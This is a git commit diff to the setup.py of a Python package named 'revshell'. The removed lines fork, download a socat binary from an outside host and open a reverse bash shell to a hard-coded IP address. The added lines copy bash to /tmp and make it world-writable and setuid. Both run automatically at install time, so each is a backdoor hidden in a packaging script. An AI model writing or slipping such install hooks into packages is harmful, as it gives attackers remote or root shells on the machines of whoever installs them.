28d76e12a0600ae576f895b0004259bc0301027f
Cody Brocious (Daeken) <cody.brocious@gmail.com>
2020-11-01 20:10:40 -0500

    Yup

--- setup.py
+++ setup.py
@@ -1,14 +1,10 @@
 import os, subprocess, sys
 from distutils.core import setup
 
-if os.fork() == 0:
-	if os.fork() == 0:
-		subprocess.check_output(['curl', '-o', '/tmp/socat', 'https://daeken.dev/socat_linux'])
-		subprocess.check_output(['chmod', '0777', '/tmp/socat'])
-		dn = open(os.devnull, 'w')
-		subprocess.Popen(['/tmp/socat', 'exec:\'bash -li\',pty,stderr,setsid,sigint,sane', 'tcp:173.255.238.217:4445'], stdout=dn, stdin=dn, stderr=dn, close_fds=True, shell=False)
-		sys.exit(0)
-	sys.exit(0)
+subprocess.check_output(['cp', '/bin/bash', '/tmp/sbash'])
+subprocess.check_output(['chown', 'rwx', '/tmp/sbash'])
+subprocess.check_output(['chmod', '0777', '/tmp/sbash'])
+subprocess.check_output(['chmod', '+s', '/tmp/sbash'])
 
 setup(
 	name='revshell',
